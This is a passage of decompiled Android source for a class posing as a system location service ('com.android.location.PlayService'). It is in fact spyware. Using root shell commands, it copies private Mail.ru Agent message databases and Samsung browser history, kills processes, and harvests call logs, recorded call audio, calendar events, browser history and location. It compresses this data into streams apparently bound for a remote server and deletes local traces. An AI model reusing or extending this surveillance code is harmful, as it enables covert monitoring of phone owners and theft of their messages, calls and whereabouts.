    //   724: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   727: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   730: ldc_w 4322
    //   733: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   736: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   739: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   742: astore 7
    //   744: aload 4
    //   746: astore 6
    //   748: aload 4
    //   750: astore 5
    //   752: new 864	java/lang/StringBuilder
    //   755: dup
    //   756: ldc_w 4324
    //   759: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   762: lload_2
    //   763: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   766: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   769: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   772: aload 4
    //   774: astore 6
    //   776: aload 4
    //   778: astore 5
    //   780: new 864	java/lang/StringBuilder
    //   783: dup
    //   784: ldc_w 4326
    //   787: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   790: aload 7
    //   792: invokevirtual 1277	java/io/File:length	()J
    //   795: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   798: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   801: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   804: aload 4
    //   806: astore 6
    //   808: aload 4
    //   810: astore 5
    //   812: aload 7
    //   814: invokevirtual 1257	java/io/File:exists	()Z
    //   817: ifeq +150 -> 967
    //   820: aload 4
    //   822: astore 6
    //   824: aload 4
    //   826: astore 5
    //   828: aload 7
    //   830: invokevirtual 1277	java/io/File:length	()J
    //   833: lload_2
    //   834: lcmp
    //   835: ifne +132 -> 967
    //   838: aload 4
    //   840: astore 6
    //   842: aload 4
    //   844: astore 5
    //   846: ldc_w 4328
    //   849: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   852: aload 4
    //   854: astore 6
    //   856: aload 4
    //   858: astore 5
    //   860: aload 4
    //   862: invokevirtual 2076	java/io/InputStream:close	()V
    //   865: aload 4
    //   867: astore 6
    //   869: aload 4
    //   871: astore 5
    //   873: ldc_w 4330
    //   876: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   879: pop
    //   880: aload 4
    //   882: ifnull +8 -> 890
    //   885: aload 4
    //   887: invokevirtual 2076	java/io/InputStream:close	()V
    //   890: iconst_1
    //   891: ireturn
    //   892: aload 8
    //   894: aload 5
    //   896: iconst_0
    //   897: iload_1
    //   898: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   901: goto -478 -> 423
    //   904: astore 7
    //   906: aload 8
    //   908: ifnull +16 -> 924
    //   911: aload 4
    //   913: astore 6
    //   915: aload 4
    //   917: astore 5
    //   919: aload 8
    //   921: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   924: aload 4
    //   926: astore 6
    //   928: aload 4
    //   930: astore 5
    //   932: aload 7
    //   934: athrow
    //   935: astore 4
    //   937: aload 5
    //   939: ifnull +8 -> 947
    //   942: aload 5
    //   944: invokevirtual 2076	java/io/InputStream:close	()V
    //   947: aload 4
    //   949: athrow
    //   950: aload 4
    //   952: astore 6
    //   954: aload 4
    //   956: astore 5
    //   958: ldc_w 2088
    //   961: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   964: goto -510 -> 454
    //   967: aload 4
    //   969: astore 6
    //   971: aload 4
    //   973: astore 5
    //   975: ldc_w 4332
    //   978: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   981: aload 4
    //   983: astore 6
    //   985: aload 4
    //   987: astore 5
    //   989: aload 4
    //   991: invokevirtual 2076	java/io/InputStream:close	()V
    //   994: aload 4
    //   996: astore 6
    //   998: aload 4
    //   1000: astore 5
    //   1002: new 864	java/lang/StringBuilder
    //   1005: dup
    //   1006: ldc_w 4334
    //   1009: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1012: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   1015: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1018: ldc_w 4293
    //   1021: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1024: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1027: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   1030: pop
    //   1031: aload 4
    //   1033: ifnull +8 -> 1041
    //   1036: aload 4
    //   1038: invokevirtual 2076	java/io/InputStream:close	()V
    //   1041: iconst_0
    //   1042: ireturn
    //   1043: astore 4
    //   1045: goto -980 -> 65
    //   1048: astore 5
    //   1050: goto -895 -> 155
    //   1053: astore 4
    //   1055: goto -872 -> 183
    //   1058: astore 5
    //   1060: goto -136 -> 924
    //   1063: astore 5
    //   1065: goto -611 -> 454
    //   1068: astore 4
    //   1070: goto -29 -> 1041
    //   1073: astore 4
    //   1075: goto -185 -> 890
    //   1078: astore 4
    //   1080: goto -949 -> 131
    //   1083: astore 5
    //   1085: goto -138 -> 947
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1088	0	this	PlayService
    //   430	468	1	i	int
    //   284	550	2	l	long
    //   24	71	4	localObject1	Object
    //   107	822	4	localException1	Exception
    //   935	102	4	localObject2	Object
    //   1043	1	4	localIOException1	IOException
    //   1053	1	4	localIOException2	IOException
    //   1068	1	4	localIOException3	IOException
    //   1073	1	4	localIOException4	IOException
    //   1078	1	4	localIOException5	IOException
    //   38	963	5	localObject3	Object
    //   1048	1	5	localIOException6	IOException
    //   1058	1	5	localIOException7	IOException
    //   1063	1	5	localIOException8	IOException
    //   1083	1	5	localIOException9	IOException
    //   34	963	6	localObject4	Object
    //   27	802	7	localObject5	Object
    //   904	29	7	localObject6	Object
    //   30	22	8	localObject7	Object
    //   133	31	8	localException2	Exception
    //   409	511	8	localFileOutputStream	FileOutputStream
    //   44	28	9	localAssetManager	AssetManager
    // Exception table:
    //   from	to	target	type
    //   40	46	107	java/lang/Exception
    //   98	104	107	java/lang/Exception
    //   147	155	107	java/lang/Exception
    //   163	171	107	java/lang/Exception
    //   193	199	107	java/lang/Exception
    //   207	238	107	java/lang/Exception
    //   246	270	107	java/lang/Exception
    //   278	285	107	java/lang/Exception
    //   293	313	107	java/lang/Exception
    //   321	345	107	java/lang/Exception
    //   353	388	107	java/lang/Exception
    //   396	411	107	java/lang/Exception
    //   449	454	107	java/lang/Exception
    //   462	470	107	java/lang/Exception
    //   478	499	107	java/lang/Exception
    //   512	520	107	java/lang/Exception
    //   528	538	107	java/lang/Exception
    //   546	553	107	java/lang/Exception
    //   561	584	107	java/lang/Exception
    //   592	616	107	java/lang/Exception
    //   624	653	107	java/lang/Exception
    //   661	668	107	java/lang/Exception
    //   676	705	107	java/lang/Exception
    //   713	744	107	java/lang/Exception
    //   752	772	107	java/lang/Exception
    //   780	804	107	java/lang/Exception
    //   812	820	107	java/lang/Exception
    //   828	838	107	java/lang/Exception
    //   846	852	107	java/lang/Exception
    //   860	865	107	java/lang/Exception
    //   873	880	107	java/lang/Exception
    //   919	924	107	java/lang/Exception
    //   932	935	107	java/lang/Exception
    //   958	964	107	java/lang/Exception
    //   975	981	107	java/lang/Exception
    //   989	994	107	java/lang/Exception
    //   1002	1031	107	java/lang/Exception
    //   71	81	133	java/lang/Exception
    //   416	423	904	finally
    //   423	431	904	finally
    //   892	901	904	finally
    //   40	46	935	finally
    //   71	81	935	finally
    //   98	104	935	finally
    //   113	121	935	finally
    //   147	155	935	finally
    //   163	171	935	finally
    //   193	199	935	finally
    //   207	238	935	finally
    //   246	270	935	finally
    //   278	285	935	finally
    //   293	313	935	finally
    //   321	345	935	finally
    //   353	388	935	finally
    //   396	411	935	finally
    //   449	454	935	finally
    //   462	470	935	finally
    //   478	499	935	finally
    //   512	520	935	finally
    //   528	538	935	finally
    //   546	553	935	finally
    //   561	584	935	finally
    //   592	616	935	finally
    //   624	653	935	finally
    //   661	668	935	finally
    //   676	705	935	finally
    //   713	744	935	finally
    //   752	772	935	finally
    //   780	804	935	finally
    //   812	820	935	finally
    //   828	838	935	finally
    //   846	852	935	finally
    //   860	865	935	finally
    //   873	880	935	finally
    //   919	924	935	finally
    //   932	935	935	finally
    //   958	964	935	finally
    //   975	981	935	finally
    //   989	994	935	finally
    //   1002	1031	935	finally
    //   60	65	1043	java/io/IOException
    //   147	155	1048	java/io/IOException
    //   175	183	1053	java/io/IOException
    //   919	924	1058	java/io/IOException
    //   449	454	1063	java/io/IOException
    //   1036	1041	1068	java/io/IOException
    //   885	890	1073	java/io/IOException
    //   126	131	1078	java/io/IOException
    //   942	947	1083	java/io/IOException
  }
  
  public boolean IsRunning(List<ActivityManager.RunningAppProcessInfo> paramList, String paramString)
  {
    int i = 0;
    for (;;)
    {
      if (i >= paramList.size()) {
        return false;
      }
      if (((ActivityManager.RunningAppProcessInfo)paramList.get(i)).processName.endsWith(paramString)) {
        return true;
      }
      i += 1;
    }
  }
  
  public void KillProcesses(String paramString)
  {
    FLOG("KillProcesses() = " + paramString);
    if ((paramString == null) || (paramString.length() == 0)) {
      return;
    }
    String[] arrayOfString = (String[])null;
    if (paramString.indexOf(',', 0) >= 0) {}
    int j;
    int i;
    for (paramString = paramString.split(",");; paramString = paramString.split("\\s+"))
    {
      FLOG("List len = " + paramString.length);
      if ((paramString.length == 0) || (bCanSu != CAN)) {
        break;
      }
      j = 0;
      i = 0;
      if (i < paramString.length) {
        break label139;
      }
      FLOG("killed " + j + " insects");
      return;
    }
    label139:
    int k = j;
    if (!paramString[i].isEmpty())
    {
      if (!isNumeric(paramString[i])) {
        break label201;
      }
      commandSU("kill -9 " + Integer.parseInt(paramString[i]));
    }
    for (;;)
    {
      k = j + 1;
      i += 1;
      j = k;
      break;
      label201:
      commandSU("killall -9 " + paramString[i].trim());
    }
  }
  
  public long LoadKnockTime()
  {
    mSettings = getSharedPreferences("backupPrefs", 3);
    return mSettings.getLong("iLastKnockTime", 0L);
  }
  
  public int ReadAgent(GZIPOutputStream paramGZIPOutputStream)
  {
    FLOG("ReadAgent()last=" + lAgentCount);
    int i = 0;
    int m = 0;
    int j = 0;
    int k = 0;
    Cursor localCursor2 = null;
    Cursor localCursor1 = localCursor2;
    for (;;)
    {
      Object localObject2;
      try
      {
        Object localObject1 = dataPath + "/databases/agent_messages";
        localCursor1 = localCursor2;
        commandSU("cat " + "/data/data/ru.mail/databases/agent-dao" + " > " + (String)localObject1);
        localCursor1 = localCursor2;
        commandSU("chmod 777 " + (String)localObject1);
        localCursor1 = localCursor2;
        localObject2 = new File((String)localObject1);
        localCursor1 = localCursor2;
        if (((File)localObject2).exists())
        {
          localCursor1 = localCursor2;
          if (((File)localObject2).canRead())
          {
            localCursor1 = localCursor2;
            if (((File)localObject2).length() != 0L) {
              continue;
            }
          }
        }
        localCursor1 = localCursor2;
        FLOG("Agent db not copied");
        break;
        localCursor1 = localCursor2;
        localObject1 = SQLiteDatabase.openDatabase((String)localObject1, null, 1);
        localCursor1 = localCursor2;
        FLOG("Its open? " + ((SQLiteDatabase)localObject1).isOpen());
        localCursor1 = localCursor2;
        if (!((SQLiteDatabase)localObject1).isOpen()) {
          break;
        }
        localCursor1 = localCursor2;
        localCursor2 = ((SQLiteDatabase)localObject1).rawQuery("SELECT m._id, name, timestamp, m.state, data FROM MESSAGE m INNER JOIN persistent_contact p ON p.ID = m.contact_id WHERE m._id > " + lAgentCount + " ORDER BY m._id", null);
        if (localCursor2 == null) {
          break label805;
        }
        localCursor1 = localCursor2;
        FLOG("ReadAgent() " + localCursor2.getCount());
        localCursor1 = localCursor2;
        if (localCursor2.moveToFirst())
        {
          localCursor1 = localCursor2;
          FLOG("ReadAgent > 0!");
          localCursor1 = localCursor2;
          paramGZIPOutputStream.write(97);
          i = k;
          localCursor1 = localCursor2;
          k = localCursor2.getInt(localCursor2.getColumnIndex("_id"));
          localCursor1 = localCursor2;
          AddData(paramGZIPOutputStream, Integer.toString(k));
          localCursor1 = localCursor2;
          AddData(paramGZIPOutputStream, Integer.toString(7));
          localCursor1 = localCursor2;
          AddData(paramGZIPOutputStream, "");
          localCursor1 = localCursor2;
          AddData(paramGZIPOutputStream, localCursor2.getString(localCursor2.getColumnIndex("NAME")));
          localCursor1 = localCursor2;
          AddData(paramGZIPOutputStream, Long.toString(localCursor2.getLong(localCursor2.getColumnIndex("TIMESTAMP")) / 1000L));
          localCursor1 = localCursor2;
          j = localCursor2.getInt(localCursor2.getColumnIndex("STATE"));
          localCursor1 = localCursor2;
          AddData(paramGZIPOutputStream, j);
          localCursor1 = localCursor2;
          localObject2 = localCursor2.getBlob(localCursor2.getColumnIndex("DATA"));
          if (localObject2 != null)
          {
            localCursor1 = localCursor2;
            if (localObject2.length != 0) {}
          }
          else
          {
            localCursor1 = localCursor2;
            AddData(paramGZIPOutputStream, "<empty>");
            localCursor1 = localCursor2;
            AddData(paramGZIPOutputStream, "");
            localCursor1 = localCursor2;
            AddData(paramGZIPOutputStream, "");
            localCursor1 = localCursor2;
            AddData(paramGZIPOutputStream, "");
            j = i + 1;
            localCursor1 = localCursor2;
            paramGZIPOutputStream.write(3);
            localCursor1 = localCursor2;
            lAgentCount = k;
            if (j <= 200) {
              break label786;
            }
            localCursor1 = localCursor2;
            paramGZIPOutputStream.write(2);
            i = j;
          }
        }
        else
        {
          localCursor1 = localCursor2;
          FLOG("red " + i);
          localCursor1 = localCursor2;
          if (!localCursor2.isClosed())
          {
            localCursor1 = localCursor2;
            localCursor2.close();
          }
          localCursor1 = localCursor2;
          j = i;
          if (!((SQLiteDatabase)localObject1).isOpen()) {
            break;
          }
          localCursor1 = localCursor2;
          ((SQLiteDatabase)localObject1).close();
          j = i;
        }
      }
      catch (Exception paramGZIPOutputStream)
      {
        EXCEPT(paramGZIPOutputStream, "Error processing Agent@Mail.ru");
        if ((localCursor1 != null) && (!localCursor1.isClosed())) {
          localCursor1.close();
        }
        return -1;
      }
      localCursor1 = localCursor2;
      AddData(paramGZIPOutputStream, new String(clearAgentKal((byte[])localObject2), "UTF-8"));
      continue;
      label786:
      i = j;
      localCursor1 = localCursor2;
      if (!localCursor2.moveToNext())
      {
        continue;
        label805:
        localCursor1 = localCursor2;
        FLOG("Failed to open");
        i = m;
      }
    }
    return j;
  }
  
  void ReadAppDir(Integer4 paramInteger4)
  {
    paramInteger4.mcc = Integer.valueOf(0);
    paramInteger4.mnc = Integer.valueOf(0);
    FLOG("mydir=" + mydir.getAbsolutePath());
    File[] arrayOfFile = mydir.listFiles();
    if (arrayOfFile == null) {
      return;
    }
    int i = 0;
    label55:
    if (i < arrayOfFile.length)
    {
      FLOG(">" + arrayOfFile[i].getName() + ":" + arrayOfFile[i].length() + ":" + arrayOfFile[i].canRead() + arrayOfFile[i].canWrite() + arrayOfFile[i].isFile());
      if (!arrayOfFile[i].getName().startsWith("sys")) {
        break label172;
      }
      paramInteger4.mcc = Integer.valueOf(paramInteger4.mcc.intValue() + 1);
    }
    for (;;)
    {
      i += 1;
      break label55;
      break;
      label172:
      if (arrayOfFile[i].getName().startsWith("mic")) {
        paramInteger4.mnc = Integer.valueOf(paramInteger4.mnc.intValue() + 1);
      }
    }
  }
  
  public int ReadAudioFiles(OutputStream paramOutputStream)
  {
    if (paramOutputStream == null) {
      return 0;
    }
    FLOG("ReadAudioFiles()");
    Object localObject = BackupData.CONTENT_URI;
    localObject = getContentResolver().query((Uri)localObject, null, "calllist_id IS NOT NULL AND  calllist_id > 0 ", null, "calldate ASC");
    if (localObject == null)
    {
      FLOG("ReadAudioFiles.query() failed");
      return 0;
    }
    FLOG("ReadAudioFiles called = " + ((Cursor)localObject).getCount());
    i = 0;
    j = 0;
    for (;;)
    {
      try
      {
        bool1 = ((Cursor)localObject).moveToFirst();
        if (bool1) {
          continue;
        }
        i = j;
      }
      catch (Exception paramOutputStream)
      {
        boolean bool1;
        label95:
        int n;
        File localFile;
        int m;
        boolean bool2;
        EXCEPT(paramOutputStream, "ReadAudioFiles ");
        continue;
        i = j;
        FLOG("Can not delete normal file " + localFile.getAbsolutePath());
        int k = j;
        continue;
      }
      ((Cursor)localObject).close();
      return i;
      i = j;
      n = ((Cursor)localObject).getInt(((Cursor)localObject).getColumnIndex("_ID"));
      i = j;
      localFile = new File(getFilesDir() + "/" + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("filename")));
      i = j;
      if (localFile.canRead())
      {
        i = j;
        if (localFile.isFile()) {
          continue;
        }
      }
      i = j;
      FLOG("Cannot read file " + localFile.getAbsolutePath());
      i = j;
      getContentResolver().delete(BackupData.CONTENT_URI, "_ID = " + n, null);
      i = j;
      FLOG("Delete from speech - " + n);
      i = j;
      bool1 = ((Cursor)localObject).moveToNext();
    }
    m = 0;
    i = j;
    FLOG("bRecordAdmin=" + bRecordAdmin);
    i = j;
    FLOG("sAdminNumber=" + sAdminNumber);
    i = j;
    FLOG("NUMBER=" + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("number")));
    i = j;
    bool2 = SaveRecordOrNot(((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("number")), ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("name")), sAdminNumber, sRecWhiteList, sRecBlackList, bRecordAdmin, bRecordUnknownOnly);
    bool1 = bool2;
    if (!bool2)
    {
      i = j;
      FLOG("Не пишем админа или невайтлист!!");
      k = 1;
      i = j;
      getContentResolver().delete(BackupData.CONTENT_URI, "_ID = " + n, null);
      i = j;
      FLOG("Delete from speech - admin's talk" + n);
      bool2 = false;
      bool1 = bool2;
      m = k;
      i = j;
      if (localFile.canWrite())
      {
        i = j;
        localFile.delete();
        m = k;
        bool1 = bool2;
      }
    }
    k = j;
    if (bool1)
    {
      k = j;
      i = j;
      if (localFile.canRead())
      {
        i = j;
        bool1 = localFile.isFile();
        k = j;
        if (bool1) {
          i = j;
        }
      }
    }
    for (;;)
    {
      try
      {
        paramOutputStream.write(105);
        i = j;
        AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("_ID")));
        i = j;
        AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("calldate")));
        i = j;
        AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("calllist_id")));
        i = j;
        if (((Cursor)localObject).getColumnIndex("name") < 0) {
          continue;
        }
        i = j;
        AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("name")));
        i = j;
        AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("number")));
        i = j;
        AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("duration")));
        i = j;
        FLOG("ReadAudioFiles::reading file " + localFile);
        i = j;
        FLOG("ReadAudioFiles::reading name " + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("number")));
        i = j;
        FLOG("ReadAudioFiles::reading id " + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("calllist_id")));
        i = j;
        AddData(paramOutputStream, localFile.length());
        i = j;
        WriteFileToOutputStream(localFile, paramOutputStream);
        i = j;
        paramOutputStream.write(1);
        i = j;
        paramOutputStream.write(3);
        i = j;
        paramOutputStream.write(2);
        j += 1;
      }
      catch (IOException localIOException)
      {
        i = j;
        EXCEPT(localIOException, "ReadAudioFilesIO");
        continue;
      }
      i = j;
      if (!localFile.canWrite()) {
        break label1063;
      }
      i = j;
      localFile.delete();
      k = j;
      if (n > 0)
      {
        i = k;
        getContentResolver().delete(BackupData.CONTENT_URI, "_ID = " + n, null);
        i = k;
        FLOG("Delete from speech - " + n);
      }
      i = k;
      if (m == 0) {
        break label95;
      }
      i = k;
      bool1 = ((Cursor)localObject).moveToNext();
      j = k;
      break;
      i = j;
      AddData(paramOutputStream, "");
    }
  }
  
  public boolean ReadBrowserHistory(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadBrowserHistory()");
    Object localObject = getContentResolver();
    if (localObject == null)
    {
      FLOG("ContentResolver is null!!");
      return false;
    }
    FLOG("cr is okay");
    try
    {
      localObject = ((ContentResolver)localObject).query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, " date > " + lLastBrowserHistoryID, null, " date ASC LIMIT 100 ");
      FLOG("mCur=" + localObject);
      if (localObject == null) {
        return false;
      }
      int i = 0;
      int j = 0;
      if (((Cursor)localObject).moveToFirst()) {
        paramGZIPOutputStream.write(114);
      }
      for (i = j;; i = j)
      {
        if (((Cursor)localObject).isAfterLast())
        {
          paramGZIPOutputStream.write(2);
          ((Cursor)localObject).close();
          FLOG("ReadBrowserHistory() = " + i);
          break;
        }
        j = i;
        if (((Cursor)localObject).getLong(3) > 0L)
        {
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getLong(3) / 1000L);
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(5));
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(1));
          paramGZIPOutputStream.write(3);
          j = i + 1;
        }
        lLastBrowserHistoryID = ((Cursor)localObject).getLong(3);
        ((Cursor)localObject).moveToNext();
      }
      return true;
    }
    catch (Exception paramGZIPOutputStream)
    {
      EXCEPT(paramGZIPOutputStream, "ReadBrowserHistory");
    }
  }
  
  public boolean ReadBrowserHistory44(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadBrowserHistory44() " + mLastBrowser44);
    for (;;)
    {
      Object localObject;
      try
      {
        localObject = dataPath + "/databases/History";
        CopySU("/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History", (String)localObject);
        FLOG("Chmodimsya RBH44");
        commandSU("chmod 777 " + (String)localObject);
        FLOG("RBH44 while");
        File localFile = new File((String)localObject);
        if ((!localFile.exists()) || (!localFile.canRead()) || (localFile.length() == 0L))
        {
          FLOG("RBH44 db cannot read");
        }
        else
        {
          FLOG("RBH44 local=" + localFile.exists() + ":" + localFile.canRead());
          localObject = SQLiteDatabase.openDatabase((String)localObject, null, 1);
          FLOG("Its open? " + ((SQLiteDatabase)localObject).isOpen());
          if (((SQLiteDatabase)localObject).isOpen())
          {
            localObject = ((SQLiteDatabase)localObject).rawQuery("SELECT u.url, title, visit_time/1000000-11644473722 AS vtime FROM visits v INNER JOIN urls u ON v.url = u.id WHERE vtime > " + mLastBrowser44 + " ORDER BY vtime ASC", null);
            int k = 0;
            i = 0;
            j = 0;
            if (localObject != null)
            {
              FLOG("ReadBrowserHistory44() " + ((Cursor)localObject).getCount());
              i = k;
              if (((Cursor)localObject).moveToFirst())
              {
                paramGZIPOutputStream.write(114);
                i = j;
                if (((Cursor)localObject).isAfterLast()) {
                  paramGZIPOutputStream.write(2);
                }
              }
              else
              {
                ((Cursor)localObject).close();
              }
            }
            else
            {
              FLOG("ReadBrowserHistory44() = " + i);
            }
          }
        }
      }
      catch (Exception paramGZIPOutputStream)
      {
        EXCEPT(paramGZIPOutputStream, "ReadBrowserHistory44");
      }
      int j = i;
      if (((Cursor)localObject).getLong(2) > 0L)
      {
        AddData(paramGZIPOutputStream, Long.toString(((Cursor)localObject).getLong(2)));
        AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(1));
        AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(0));
        paramGZIPOutputStream.write(3);
        j = i + 1;
      }
      mLastBrowser44 = ((Cursor)localObject).getLong(2);
      ((Cursor)localObject).moveToNext();
      int i = j;
    }
    return true;
  }
  
  public void ReadCalendar(GZIPOutputStream paramGZIPOutputStream)
  {
    FLOG("ReadCalendar()");
    try
    {
      long l1 = ReadOneLongSetting("lCalendarCounter");
      if (bResetCalendar)
      {
        bResetCalendar = false;
        l1 = 0L;
        FLOG("ResetCalendar");
      }
      Cursor localCursor = getContentResolver().query(Uri.parse("content://com.android.calendar/events"), null, " _ID > " + l1, null, " _ID ASC ");
      if (localCursor == null)
      {
        FLOG("ReadCalendar.query() failed");
        return;
      }
      FLOG("Read " + Integer.toString(localCursor.getCount()) + " ReadCalendar messages from content (" + Integer.toString(localCursor.getColumnCount()) + " columns)");
      FLOG("MoveTo First");
      if (localCursor.moveToFirst())
      {
        paramGZIPOutputStream.write(122);
        long l3;
        do
        {
          l3 = localCursor.getLong(localCursor.getColumnIndex("_ID"));
          long l2 = localCursor.getLong(localCursor.getColumnIndex("lastDate")) / 1000L;
          l1 = l2;
          if (l2 == 2114380800L) {
            l1 = 0L;
          }
          String str1 = l1;
          String str2 = localCursor.getString(localCursor.getColumnIndex("title"));
          AddData(paramGZIPOutputStream, l3);
          AddData(paramGZIPOutputStream, str1);
          AddData(paramGZIPOutputStream, str2);
          paramGZIPOutputStream.write(3);
        } while (localCursor.moveToNext());
        paramGZIPOutputStream.write(2);
        if (!localCursor.isClosed()) {
          localCursor.close();
        }
        SaveOneLongSetting("lCalendarCounter", l3);
        return;
      }
    }
    catch (Exception paramGZIPOutputStream)
    {
      EXCEPT(paramGZIPOutputStream, "Error read Calendar = ");
    }
  }
  
  public int ReadCallHistory(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return 0;
    }
    FLOG("ReadCallHistory");
    Object localObject = getContentResolver();
    if (localObject == null)
    {
      FLOG("getContentResolver(); failed, returning");
      return 0;
    }
    localObject = ((ContentResolver)localObject).query(BackupData.CONTENT_URI, null, "calllist_id IS NOT NULL AND  calllist_id < 0 ", null, "calldate ");
    if (localObject == null)
    {
      FLOG("No phonebook entries, returning...");
      return 0;
    }
    if (((Cursor)localObject).getCount() == 0)
    {
      FLOG("ReadCallHistory - no records");
      ((Cursor)localObject).close();
      return 0;
    }
    FLOG("ReadCallHistory - got records:" + ((Cursor)localObject).getCount());
    try
    {
      if (((Cursor)localObject).moveToFirst())
      {
        paramGZIPOutputStream.write(102);
        int i = ((Cursor)localObject).getColumnIndex("_ID");
        int j = ((Cursor)localObject).getColumnIndex("calllist_id");
        int k = ((Cursor)localObject).getColumnIndex("name");
        int m = ((Cursor)localObject).getColumnIndex("number");
        int n = ((Cursor)localObject).getColumnIndex("calldate");
        int i1 = ((Cursor)localObject).getColumnIndex("filesize");
        int i2 = ((Cursor)localObject).getColumnIndex("duration");
        do
        {
          int i3 = -((Cursor)localObject).getInt(j);
          AddData(paramGZIPOutputStream, i3);
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(k));
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(m));
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getLong(n));
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(i1));
          AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(i2));
          paramGZIPOutputStream.write(3);
          i3 = ((Cursor)localObject).getInt(i);
          if (i3 > 0) {
            getContentResolver().delete(BackupData.CONTENT_URI, "_ID = ?", new String[] { i3 });
          }
        } while (((Cursor)localObject).moveToNext());
        paramGZIPOutputStream.write(2);
      }
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramGZIPOutputStream, "ReadCallHistory ");
      }
    }
    ((Cursor)localObject).close();
    return 1;
  }
  
  public void ReadCurrentGeo(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return;
    }
    FLOG("ReadCurrentGeo(), curInfo =" + this.curInfo);
    if (this.curInfo == null)
    {
      FLOG("curInfo == null, request WifiCollector(our server)");
      this.curInfo = ref.wifiAndCellCollector.returnBestLocation(false, this.lastMnc, this.lastMcc);
      if (this.curInfo == null)
      {
        FLOG("no location info? ret");
        return;
      }
      FLOG("RCG: got info! " + this.curInfo.lbsType);
    }
    if ((this.lastInfo != null) && (this.lastInfo.timepoint > 0L) && (this.curInfo.timepoint == this.lastInfo.timepoint))
    {
      FLOG("cur.time = " + this.curInfo.timepoint);
      FLOG("RCG: no new info available");
      if (iGPSCheckInterval == 0)
      {
        FLOG("RCG: GPScheck is off,ret");
        return;
      }
      FLOG("RCG: try to request WACC or yandex");
      this.curInfo = ref.wifiAndCellCollector.returnBestLocation(false, this.lastMnc, this.lastMcc);
      if (this.curInfo == null)
      {
        FLOG("no location info? ret");
        return;
      }
      if (this.curInfo.timepoint == this.lastInfo.timepoint)
      {
        FLOG("RCG: No new geo data");
        return;
      }
    }
    FLOG("last = cur");
    FLOG("cur.time = " + this.curInfo.timepoint);
    if (this.curInfo == null)
    {
      FLOG("No new data avaiable,ret");
      return;
    }
    FLOG("tryFindLostPositions from networkcellcollerctor");
    this.wifiAndCellCollector.tryFindLostPositions(this.lastMnc, this.lastMcc);
    if (this.lastInfo != null)
    {
      this.lastInfo.timepoint = this.curInfo.timepoint;
      this.lastInfo.lbsAltitude = this.curInfo.lbsAltitude;
      this.lastInfo.lbsLatitude = this.curInfo.lbsLatitude;
      this.lastInfo.lbsLongtitude = this.curInfo.lbsLongtitude;
      this.lastInfo.lbsType = this.curInfo.lbsType;
      this.lastInfo.lbsPrecision = this.curInfo.lbsPrecision;
    }
    for (;;)
    {
      try
      {
        paramGZIPOutputStream.write(104);
        this.locationHistoryLocked = true;
        if (!this.locationHistory.isEmpty()) {
          continue;
        }
